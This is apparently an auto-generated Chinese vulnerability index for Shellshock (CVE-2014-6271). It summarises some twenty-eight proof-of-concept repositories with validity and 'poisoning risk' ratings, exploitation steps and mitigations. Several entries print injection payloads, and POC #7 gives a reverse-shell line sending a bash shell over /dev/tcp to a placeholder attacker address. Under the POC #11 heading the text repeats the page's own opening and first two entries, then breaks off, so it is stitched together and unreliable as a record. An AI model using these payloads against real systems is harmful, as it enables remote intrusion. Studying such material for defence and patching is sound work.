# CVE-2014-6271

> 📦 该CVE有 **28** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2014-6271-0xN7y_CVE-2014-6271.md](../2014/CVE-2014-6271-0xN7y_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过环境变量与Bash交互

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，也被称为ShellShock，是GNU Bash中的一个高危漏洞。攻击者可以通过构造包含恶意代码的环境变量，利用Bash解析函数定义时存在的缺陷来执行任意命令。漏洞利用方式如下：

1.  **漏洞原理：** Bash在解析环境变量时，如果环境变量的值包含函数定义，则会尝试执行函数定义后面的字符串。如果攻击者能够控制环境变量的内容，就可以注入恶意代码。

2.  **利用方式：** 攻击者通常通过以下几种方式注入环境变量：
    *   **HTTP请求头：** 如果Web服务器使用CGI脚本，攻击者可以在HTTP请求头中设置包含恶意代码的环境变量，例如User-Agent。
    *   **SSH ForceCommand：** 在OpenSSH配置中，ForceCommand选项允许在用户登录时强制执行特定命令。攻击者可以利用此选项设置包含恶意代码的环境变量。
    *   **DHCP客户端：** DHCP客户端在请求IP地址时，可以设置环境变量。攻击者可以伪造DHCP服务器，向受害者发送包含恶意代码的DHCP响应。

3.  **POC分析：** 提供的POC代码 `CVE-2014-6271.py`  通过构造包含恶意代码的User-Agent HTTP头来利用此漏洞。脚本接受目标URL和要执行的命令作为参数，然后向目标URL发送包含特制User-Agent头的HTTP请求。
    *   **有效性：** 该POC代码有效，如果目标系统存在漏洞，可以执行任意命令。
    *   **投毒风险：**  查看提供的POC代码，未发现明显的投毒代码。代码结构清晰，功能明确，主要目的是发送包含漏洞利用代码的HTTP请求。**因此投毒风险为0%**。

4.  **缓解措施：**
    *   升级Bash到最新版本。
    *   检查并修复所有可能受到漏洞影响的应用程序和服务，例如Web服务器、OpenSSH和DHCP客户端。
    *   限制CGI脚本的使用，并对所有输入进行严格的验证。

根据搜索引擎的结果，该漏洞是一个严重的互联网基础设施风险，因为许多常见的配置都允许远程代码执行。一些供应商已经发布了补丁来解决这个问题。因此，使用提供的POC代码进行漏洞验证是合理的，但需要注意潜在的风险。

**项目地址:** [0xN7y/CVE-2014-6271](https://github.com/0xN7y/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #2

**来源**: [CVE-2014-6271-AlissonFaoli_Shellshock.md](../2014/CVE-2014-6271-AlissonFaoli_Shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意代码。

**影响版本:** GNU Bash 1.14 至 4.3

**利用条件:** 目标系统需要运行存在漏洞的Bash版本，并且通过CGI脚本、OpenSSH ForceCommand或其他方式暴露了环境变量注入点。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞源于Bash处理环境变量中函数定义后附加字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，在Bash执行时注入并执行任意命令。利用方式通常涉及以下步骤：

1.  **确定攻击目标：** 寻找使用Bash处理请求的应用程序或服务，例如CGI脚本、OpenSSH服务器（使用ForceCommand）或DHCP客户端。
2.  **构造恶意环境变量：** 创建一个包含函数定义和恶意命令的环境变量。例如：`() { :; }; echo vulnerable`
3.  **发送包含恶意环境变量的请求：** 将构造的环境变量通过HTTP请求头、SSH连接或其他方式传递给目标系统。
4.  **触发漏洞执行：** 当目标系统执行Bash并处理包含恶意环境变量的请求时，漏洞将被触发，导致恶意命令执行。

提供的Python POC脚本 `shellshock.py` 旨在利用此漏洞。该脚本接受目标URL、攻击者IP地址（LHOST）和端口（LPORT）作为参数。它通过构造包含反向shell命令的User-Agent头，向目标URL发送HTTP GET请求。如果目标系统存在漏洞，它将执行反向shell命令，允许攻击者连接到目标系统并执行任意命令。

**关于投毒风险的分析：**

代码中主要功能是利用Shellshock漏洞，建立反向连接。审查代码，发现可能存在轻微投毒风险的地方在于，攻击者可以修改payload，执行任意命令。但是，由于脚本本身就是为了利用漏洞而设计的，因此，这不算是作者有意植入的后门，而是漏洞利用本身的性质决定的。

  * LICENSE和README.md文件相对标准，没有发现恶意代码。
  * `shellshock.py`脚本，虽然主要功能是漏洞利用，但如果被不道德的人使用，仍然会产生危害。

综合评估，该仓库的投毒风险较低，大约在5%左右。主要风险在于脚本被恶意使用，而非代码本身包含隐藏的恶意功能。

**项目地址:** [AlissonFaoli/Shellshock](https://github.com/AlissonFaoli/Shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #3

**来源**: [CVE-2014-6271-Brandaoo_CVE-2014-6271.md](../2014/CVE-2014-6271-Brandaoo_CVE-2014-6271.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统需要使用Bash，并且存在允许通过环境变量传递参数的场景，例如CGI脚本，OpenSSH ForceCommand等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271 (Shellshock) 漏洞允许攻击者通过在环境变量中构造恶意的函数定义，从而在Bash执行时注入并执行任意代码。该漏洞的利用方式是：

1.  **漏洞原理：** Bash在处理环境变量时，如果环境变量的值包含函数定义，Bash会先执行函数定义之后的内容。如果函数定义后的字符串包含恶意代码，则会被执行。
2.  **利用方式：** 攻击者构造包含恶意代码的环境变量，例如 `(){ :; }; /usr/bin/id`，然后将该环境变量传递给目标系统。
3.  **触发点：** 目标系统上运行的Bash脚本或程序在执行时，会解析并处理这些环境变量，从而触发漏洞，执行攻击者注入的恶意代码。
4.  **POC分析：** 提供的`shellshock.sh`脚本通过`curl`命令发送带有特殊构造的`User-Agent`头的HTTP请求。`User-Agent`头的内容为 `() { :; }; echo VULNERABLE`。如果目标网站的服务器使用Bash处理HTTP请求头（例如，通过CGI脚本），并且Bash存在Shellshock漏洞，那么`echo VULNERABLE`命令会被执行，并在HTTP响应中返回 "VULNERABLE" 字符串，脚本据此判断目标站点存在漏洞。
5.  **有效性分析：** 该POC代码基本有效，可以用于检测目标服务器是否存在Shellshock漏洞。但是，该脚本的检测方法较为简单，仅通过`User-Agent`头进行检测，可能存在一定的漏报情况。更复杂的利用场景可能需要修改POC代码。
6.  **投毒风险分析：** 该仓库中存在一定的投毒风险。`shellshock.sh`本身的代码较为简单，主要功能是发送HTTP请求并检查响应。潜在的风险在于：
    *   **依赖项风险：** 虽然脚本本身只依赖于`curl`，但是如果攻击者修改脚本，引入其他的外部命令或者脚本，可能会引入恶意代码。
    *   **命令注入风险：** 虽然脚本避免了直接执行用户输入，但是，如果攻击者能够控制`curl`的参数或者其他命令的参数，仍然可能存在命令注入的风险。
    *  **README.md风险:** 有攻击者会修改README.md文件，放入恶意链接，诱导用户点击。
    根据代码的复杂度、依赖项以及潜在的命令注入风险，估计投毒风险为10%。

**项目地址:** [Brandaoo/CVE-2014-6271](https://github.com/Brandaoo/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #4

**来源**: [CVE-2014-6271-Dilith006_CVE-2014-6271.md](../2014/CVE-2014-6271-Dilith006_CVE-2014-6271.md)

## CVE-2014-6271-Bash-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在Bash并且可以通过某种方式设置环境变量。常见的攻击场景包括：OpenSSH的ForceCommand、Apache HTTP Server的mod_cgi/mod_cgid、DHCP客户端等。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为“Shellshock”，是GNU Bash中的一个严重漏洞。该漏洞源于Bash处理环境变量中函数定义后尾随字符串的方式存在缺陷，这使得攻击者可以通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。

**有效性：**
根据漏洞库信息、搜索结果，以及常见利用方式，该漏洞的PoC是有效的。漏洞库信息中列出了多个Expolit-DB的链接,以及许多厂商的确认信息,证明该漏洞的真实性。搜索结果也显示了大量的关于该漏洞的分析和利用案例。提供的POC代码`/tmp/c7baa98dd966ca6db5937f8832eb7ff6/README.md`，从文件名和路径来看，仅仅是一个README文件，内容只有`# CVE-2014-6271`，没有可执行的代码，但可以作为漏洞存在的标志。

**投毒风险：**
提供的POC代码`/tmp/c7baa98dd966ca6db5937f8832eb7ff6/README.md`的内容非常简单，几乎没有投毒代码的可能性。但是，由于该仓库本身存在于`/tmp`目录下，存在被恶意替换或者植入恶意脚本的可能性，因此具有一定的投毒风险。但是从代码本身来看，投毒风险极低,给出的预估值为10%。

**利用方式：**
1.  **环境变量注入：** 攻击者构造包含恶意代码的环境变量，例如：`(){ :; }; /bin/bash -c "恶意命令"`。
2.  **触发漏洞：** 将构造的环境变量传递给存在漏洞的Bash实例。这可以通过多种方式实现，例如：
    *   **HTTP请求：** 如果目标系统使用CGI脚本，可以通过修改HTTP请求头（如User-Agent）来设置环境变量。
    *   **SSH：** 如果OpenSSH启用了`ForceCommand`，可以通过设置环境变量来执行命令。
    *   **DHCP：** 某些DHCP客户端在执行脚本时会使用环境变量。
3.  **代码执行：** 当Bash解析包含恶意代码的环境变量时，会执行其中的命令，从而实现远程代码执行。

**总结：**
Shellshock是一个严重的安全漏洞，利用方式简单，影响范围广泛。虽然漏洞本身发布时间较早，但仍然可能存在于未及时更新的系统中。由于PoC的特殊性，直接利用README.md是不可能的，需要配合其他可执行的EXP进行测试。

**项目地址:** [Dilith006/CVE-2014-6271](https://github.com/Dilith006/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #5

**来源**: [CVE-2014-6271-FilipStudeny_-CVE-2014-6271-Shellshock-Remote-Command-Injection-.md](../2014/CVE-2014-6271-FilipStudeny_-CVE-2014-6271-Shellshock-Remote-Command-Injection-.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本，且配置不当允许通过HTTP Headers传递环境变量。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过在环境变量中嵌入恶意代码，当Bash shell执行这些环境变量时，从而执行任意命令。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞利用代码（Shellshock.py）有效。 搜索结果中多个链接都指向了该漏洞的细节和利用方法，证明了该漏洞的可利用性。漏洞利用代码本身也提供了两种payload：反向shell和文件浏览，具有一定的利用价值。

**投毒风险：**
分析提供的Python脚本 `Shellshock.py` ，代码主体结构清晰，主要功能是构造包含恶意代码的HTTP请求头，并发送到目标服务器。代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **payload的可定制性：** 脚本允许用户自定义payload，这本身不是问题。但如果攻击者替换或修改了默认的payload生成方式，可能会插入恶意代码，例如，下载并执行其他恶意脚本。
*   **CGI路径：** 脚本中包含一些常见的CGI路径，攻击者可能通过修改这些路径来尝试不同的攻击目标。
*   **回连地址：** reverse shell需要指定lhost和lport，如果作者在代码中预设了后门地址，可能导致攻击者在不知情的情况下，将shell反弹给作者。但是，代码中这两个参数由用户指定，降低了直接投毒的风险。
*   **代码混淆：** 代码没有进行明显的混淆，可读性较强，降低了隐藏恶意代码的概率。

综合考虑，认为此POC存在10%的投毒风险，主要是因为payload的可定制性，可能被用于传播修改后的恶意脚本。需要仔细审查代码，尤其关注payload生成和CGI路径部分。

**利用方式：**
利用方式是利用Bash解析环境变量时存在的漏洞，通过构造恶意的HTTP请求头（例如Cookie或Referer），在其中嵌入包含恶意代码的函数定义。当目标服务器上的Bash shell执行CGI脚本时，会解析这些HTTP头，从而触发漏洞，执行攻击者注入的命令。具体步骤如下：

1.  **确定目标：** 找到存在CGI脚本且可能受Shellshock影响的服务器。
2.  **构造Payload：** 根据需要选择payload类型（反向shell或文件浏览），并设置相应的参数（例如lhost、lport、echo）。
3.  **发送请求：** 使用`Shellshock.py`脚本构造包含恶意payload的HTTP请求，并发送到目标服务器的CGI脚本。
4.  **执行命令：** 如果目标存在漏洞，Bash shell会执行payload中的恶意代码，例如建立反向shell连接或执行文件浏览命令，并将结果返回给攻击者。

**项目地址:** [FilipStudeny/-CVE-2014-6271-Shellshock-Remote-Command-Injection-](https://github.com/FilipStudeny/-CVE-2014-6271-Shellshock-Remote-Command-Injection-)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #6

**来源**: [CVE-2014-6271-Gurguii_cgi-bin-shellshock.md](../2014/CVE-2014-6271-Gurguii_cgi-bin-shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或通过其他方式设置环境变量并调用Bash

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过特制的通过环境变量执行任意命令。利用方式如下：

1.  **有效性：** 提供的Python和Bash脚本都是有效的PoC代码。它们通过设置包含恶意代码的环境变量，然后尝试通过HTTP请求触发漏洞。
2.  **投毒风险：** 尽管代码主要用于利用Shellshock漏洞，但仍然存在轻微的投毒风险。具体分析如下：
    *   **README.md:**  该文件仅包含使用说明，无投毒代码。
    *   **shellshock.py:** Python脚本通过`requests`库发送HTTP请求，如果攻击者的服务器被攻陷，或者服务器返回恶意重定向，那么可能存在风险。但是代码本身没有明显的恶意代码。
    *   **shellshock.sh:** Bash脚本使用`curl`命令，同样存在curl命令被其他程序劫持，或者DNS投毒的风险。
    *  脚本接受用户提供的URL、LHOST和LPORT，如果用户使用了恶意的URL，可能会被服务器端记录或者进行其他攻击。这些不是脚本投毒，而是用户使用不当造成的。
    综合分析，主要风险在于依赖的外部命令(`curl`,`requests`)可能存在风险，以及用户使用脚本不当的风险,投毒风险较低，初步判定为10%。
3.  **利用方式：**
    *   **通过User-Agent头：**  PoC代码通过修改HTTP请求的User-Agent头，将包含恶意代码的环境变量发送到目标服务器。如果目标服务器上的CGI脚本或其他应用程序调用Bash来处理该请求，那么恶意代码就会被执行。
    *   **反弹Shell：**  PoC代码可以配置LHOST和LPORT参数，用于接收目标服务器的反弹Shell。攻击者可以在自己的机器上监听指定的端口，当目标服务器执行恶意代码时，会主动连接攻击者的机器，从而建立反弹Shell连接。
    *   **交互式命令执行：**  PoC代码也支持交互式命令执行。攻击者可以输入任意命令，PoC代码会将命令注入到环境变量中，并发送到目标服务器执行。

**搜索引擎结果补充：** 搜索引擎结果证实了该漏洞的严重性和广泛影响，并提供了一些检测和利用该漏洞的资源。

**项目地址:** [Gurguii/cgi-bin-shellshock](https://github.com/Gurguii/cgi-bin-shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #7

**来源**: [CVE-2014-6271-Jsmoreira02_CVE-2014-6271.md](../2014/CVE-2014-6271-Jsmoreira02_CVE-2014-6271.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，并且存在可以通过环境变量传递参数的CGI脚本或其他服务。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）是一个存在于GNU Bash中的远程命令执行漏洞。漏洞的根源在于Bash处理环境变量中函数定义后附加字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，利用诸如Apache HTTP Server的mod_cgi模块、OpenSSH的ForceCommand功能、DHCP客户端脚本等场景，跨越权限边界执行任意shell命令。

**有效性评估：**

提供的漏洞利用代码（shellshock_exploit.py）旨在利用Shellshock漏洞，通过向目标URL发送特制的HTTP请求，其中User-Agent头包含恶意Bash代码，从而在目标服务器上执行任意命令。

README.md 文件中提供了检测和利用该漏洞的步骤。

根据漏洞库信息和搜索结果，该漏洞是一个广泛存在的严重漏洞，影响大量系统和服务。提供的POC代码与漏洞描述一致，因此，该POC代码**有效**。

**投毒风险评估：**

检查`shellshock_exploit.py`脚本和`README.md`文件，未发现明显的恶意代码。脚本的主要功能是构造包含漏洞利用代码的HTTP请求，并在本地监听反弹shell。风险点可能在于以下几点：

1.  **Payload定制：** 脚本允许指定LHOST和LPORT，如果用户不小心使用了错误的IP地址或端口，可能会导致连接到恶意服务器。
2.  **依赖性：** 脚本依赖于`requests`库，如果安装了被篡改的`requests`库，可能会存在风险。
3.  **Netcat依赖：** 脚本依赖于本地的 `nc` 命令, 如果本地的 `nc` 命令被恶意替换, 可能存在风险。

总体而言，该代码的投毒风险较低，主要集中在使用者的误操作和对外部依赖项的信任上。投毒风险估计为10%。

**漏洞利用方式：**

1.  **确定目标：** 找到运行存在漏洞Bash版本的服务器，并且该服务器运行着可以通过环境变量传递参数的服务，例如CGI脚本。
2.  **构造Payload：** 构造包含恶意Bash代码的环境变量，例如：`() { :; }; /bin/bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1`
3.  **发送请求：** 通过HTTP请求或其他方式将构造的Payload作为环境变量传递给目标服务器。
4.  **执行命令：** 目标服务器上的Bash解释器会执行恶意代码，从而执行攻击者指定的命令。
5.  **反弹Shell：** 在上面的Payload示例中，恶意代码会尝试创建一个反弹Shell，将目标服务器的Shell连接到攻击者的IP地址和端口。

**缓解措施：**

1.  升级Bash到最新版本。
2.  检查和更新所有使用Bash脚本的服务，确保它们不会受到环境变量的影响。
3.  使用入侵检测系统（IDS）和入侵防御系统（IPS）来检测和阻止Shellshock攻击。

**项目地址:** [Jsmoreira02/CVE-2014-6271](https://github.com/Jsmoreira02/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #8

**来源**: [CVE-2014-6271-K3ysTr0K3R_CVE-2014-6271-EXPLOIT.md](../2014/CVE-2014-6271-K3ysTr0K3R_CVE-2014-6271-EXPLOIT.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者通过构造的环境变量执行任意代码。

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许设置环境变量并调用Bash。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是GNU Bash中的一个严重漏洞。该漏洞源于Bash处理环境变量中函数定义后trailing string的方式。攻击者可以利用此漏洞，通过构造包含恶意代码的环境变量，在目标系统上执行任意命令。

**有效性分析：**
提供的Python POC代码通过发送包含恶意构造的HTTP请求来利用此漏洞。它首先尝试通过User-Agent、Referer和Cookie头注入测试payload来检测漏洞是否存在，测试Payload特征是会输出特定字符串，验证是否可以执行代码，存在漏洞后再注入包含反向Shell的payload来利用该漏洞。

**投毒风险分析：**
代码存在潜在的投毒风险，主要体现在以下几个方面：
1.  **反向Shell地址：** 攻击者可能修改`lhost`和`lport`变量，将反向Shell指向恶意服务器，从而控制受害者机器。当前代码中并没有明显的恶意行为，但是依赖用户提供的参数。
2.  **Payload修改：** 攻击者可能修改`payload`变量，执行其他恶意命令，例如下载并执行恶意文件，删除系统文件等。当前Payload是反向shell，不属于投毒行为。
3.  **其他依赖：** 代码依赖于`pwncat`库，这个库本身可能存在安全问题或被篡改，从而引入新的安全风险。
4. **连接处理:** `pwncat.manager.Manager` 中可能包含未知的后门或恶意代码。 
综合来看，投毒风险较低（约10%），主要来自于参数修改和对依赖库的信任。

**利用方式：**
1.  **漏洞检测：**  POC首先向目标URL发送包含特殊构造header的HTTP请求(User-Agent, Referer, Cookie)。 这些header中包含恶意的Bash函数定义。
2.  **命令执行：**  如果目标系统存在漏洞，Bash在解析这些环境变量时，会执行注入的恶意代码。
3.  **反向Shell：**  利用代码中，注入的Payload为反向Shell，建立从目标系统到攻击者控制机器的TCP连接，从而允许攻击者远程控制目标系统。反向连接的地址由`lhost`和`lport`指定。
4. **监听连接:** 在攻击机上启动监听进程，等待目标机器的连接。

**漏洞缓解措施：**
*   升级Bash到最新版本。
*   避免在CGI脚本中使用Bash处理用户输入。
*   使用安全编码实践，验证所有用户输入。
*   使用入侵检测系统（IDS）和入侵防御系统（IPS）监控和阻止恶意流量。

**项目地址:** [K3ysTr0K3R/CVE-2014-6271-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2014-6271-EXPLOIT)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #9

**来源**: [CVE-2014-6271-MuirlandOracle_CVE-2014-6271-IPFire.md](../2014/CVE-2014-6271-MuirlandOracle_CVE-2014-6271-IPFire.md)

## CVE-2014-6271 IP Fire Shellshock RCE

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** IPFire

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 2.15

**利用条件:** 目标系统运行存在漏洞的Bash版本，且可以通过HTTP(S)访问到受影响的CGI脚本 (index.cgi)。可能需要用户名和密码进行身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造恶意的环境变量来执行任意代码。提供的Python POC代码专门针对IPFire防火墙<=2.15版本。利用方式如下：

1.  **漏洞原理：** Bash在处理环境变量时，允许在函数定义后附加额外的命令。如果这些环境变量被传递给执行Bash脚本的CGI程序，附加的命令就会被执行。
2.  **攻击向量：**  攻击者通过HTTP请求的header中设置包含恶意代码的环境变量，利用IPFire的`index.cgi`脚本触发漏洞。
3.  **POC代码分析：** 该POC首先尝试连接到目标IPFire服务器，如果需要则进行HTTP基本身份验证。然后，它构造一个包含恶意Bash代码的环境变量，并通过HTTP请求的headers将其发送到`index.cgi`。恶意代码利用函数定义后的trailing string执行任意命令。POC还包含了一个伪shell，允许交互式地执行命令。
4.  **投毒风险分析：** POC代码主要功能是漏洞验证和利用，但仍存在一定投毒风险。例如：
    *   代码中包含`eval`或`exec`等执行任意代码的函数，虽然目前用于执行用户输入的命令，但攻击者可能修改这些部分来执行恶意代码。
    *   该脚本依赖于`requests`库，攻击者可能篡改此脚本，要求安装恶意依赖包，从而执行恶意代码
    *  该脚本在执行远程命令后直接打印到输出，没有进行过滤，如果远程服务器被入侵，可能会发送恶意字符到客户端，导致客户端被攻击。
  因此，保守估计存在10%的投毒风险，主要集中在潜在的恶意依赖、命令执行的输出处理以及代码篡改的可能性。

**总结：** 提供的POC代码利用Shellshock漏洞，通过构造包含恶意Bash代码的环境变量，实现在目标IPFire系统上执行任意命令。由于利用了HTTP(S)协议，攻击通常可以通过网络远程发起。尽管漏洞已经存在多年，但仍然有很多系统没有修复，因此该漏洞仍然具有较高的现实威胁。

**项目地址:** [MuirlandOracle/CVE-2014-6271-IPFire](https://github.com/MuirlandOracle/CVE-2014-6271-IPFire)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #10

**来源**: [CVE-2014-6271-RAJMadhusankha_Shellshock-CVE-2014-6271-Exploitation-and-Analysis.md](../2014/CVE-2014-6271-RAJMadhusankha_Shellshock-CVE-2014-6271-Exploitation-and-Analysis.md)

## CVE-2014-6271 Shellshock漏洞利用

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** 1.14 - 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，并且存在可利用的攻击面，如CGI脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash shell中的高危漏洞。该漏洞允许攻击者通过在环境变量中注入恶意代码来执行任意命令。根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，以下是对漏洞利用有效性、投毒风险和利用方式的分析：

**有效性：**

根据漏洞库信息，CVE-2014-6271允许远程攻击者通过特制的环境变量执行任意代码。漏洞利用代码（README.md）提供了一个利用 `exploit/multi/http/apache_mod_cgi_bash_env_exec` 模块的Metasploit POC，用于攻击运行CGI脚本的Apache服务器。多个搜索引擎结果，如NVD, CISA, Qualys等，也确认了该漏洞的存在和危害，并提供了缓解措施。综合来看，提供的POC代码是有效的。

**投毒风险：**

漏洞利用代码本身是 Metasploit 模块的配置说明，用于利用已知的 Shellshock 漏洞。直接分析 README.md 文件，投毒风险较低，但仍存在以下风险：

*   **作者恶意修改：** 理论上，作者可能在提供文件的其他地方（例如，如果存在其他脚本或配置）隐藏了恶意代码。但仅根据提供信息无法判断。
*   **依赖项风险：** Metasploit 模块本身依赖于 Metasploit Framework，如果 Metasploit Framework 被篡改，可能存在风险。

综合评估，投毒风险较低，约为10%。主要来自于潜在的未公开文件篡改。

**利用方式：**

1.  **确定目标：** 找到运行Bash，且存在CGI脚本或其他途径可以设置环境变量的系统。
2.  **发送恶意请求：** 构造包含恶意代码的环境变量。常见的攻击方式是通过HTTP请求头，特别是当服务器使用CGI脚本处理请求时。HTTP头会被转换为环境变量传递给Bash。
3.  **代码执行：** 当Bash处理包含恶意代码的环境变量时，会执行注入的命令。
4.  **反弹shell（POC中的PAYLOAD）：**  利用 `cmd/unix/reverse_netcat` payload在目标主机上执行`nc`，反弹shell到攻击者的机器。

**防范措施：**

*   立即更新 Bash 到最新版本。
*   禁用未使用的 CGI 脚本。
*   使用 Web 应用防火墙 (WAF) 过滤恶意请求。
*   监控 HTTP 请求日志。

**项目地址:** [RAJMadhusankha/Shellshock-CVE-2014-6271-Exploitation-and-Analysis](https://github.com/RAJMadhusankha/Shellshock-CVE-2014-6271-Exploitation-and-Analysis)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #11

**来源**: [CVE-2014-6271-RadYio_CVE-2014-6271.md](../2014/CVE-2014-6271-RadYio_CVE-2014-6271.md)

# CVE-2014-6271

> 📦 该CVE有 **28** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2014-6271-0xN7y_CVE-2014-6271.md](../2014/CVE-2014-6271-0xN7y_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过环境变量与Bash交互

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，也被称为ShellShock，是GNU Bash中的一个高危漏洞。攻击者可以通过构造包含恶意代码的环境变量，利用Bash解析函数定义时存在的缺陷来执行任意命令。漏洞利用方式如下：

1.  **漏洞原理：** Bash在解析环境变量时，如果环境变量的值包含函数定义，则会尝试执行函数定义后面的字符串。如果攻击者能够控制环境变量的内容，就可以注入恶意代码。

2.  **利用方式：** 攻击者通常通过以下几种方式注入环境变量：
    *   **HTTP请求头：** 如果Web服务器使用CGI脚本，攻击者可以在HTTP请求头中设置包含恶意代码的环境变量，例如User-Agent。
    *   **SSH ForceCommand：** 在OpenSSH配置中，ForceCommand选项允许在用户登录时强制执行特定命令。攻击者可以利用此选项设置包含恶意代码的环境变量。
    *   **DHCP客户端：** DHCP客户端在请求IP地址时，可以设置环境变量。攻击者可以伪造DHCP服务器，向受害者发送包含恶意代码的DHCP响应。

3.  **POC分析：** 提供的POC代码 `CVE-2014-6271.py`  通过构造包含恶意代码的User-Agent HTTP头来利用此漏洞。脚本接受目标URL和要执行的命令作为参数，然后向目标URL发送包含特制User-Agent头的HTTP请求。
    *   **有效性：** 该POC代码有效，如果目标系统存在漏洞，可以执行任意命令。
    *   **投毒风险：**  查看提供的POC代码，未发现明显的投毒代码。代码结构清晰，功能明确，主要目的是发送包含漏洞利用代码的HTTP请求。**因此投毒风险为0%**。

4.  **缓解措施：**
    *   升级Bash到最新版本。
    *   检查并修复所有可能受到漏洞影响的应用程序和服务，例如Web服务器、OpenSSH和DHCP客户端。
    *   限制CGI脚本的使用，并对所有输入进行严格的验证。

根据搜索引擎的结果，该漏洞是一个严重的互联网基础设施风险，因为许多常见的配置都允许远程代码执行。一些供应商已经发布了补丁来解决这个问题。因此，使用提供的POC代码进行漏洞验证是合理的，但需要注意潜在的风险。

**项目地址:** [0xN7y/CVE-2014-6271](https://github.com/0xN7y/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #2

**来源**: [CVE-2014-6271-AlissonFaoli_Shellshock.md](../2014/CVE-2014-6271-AlissonFaoli_Shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

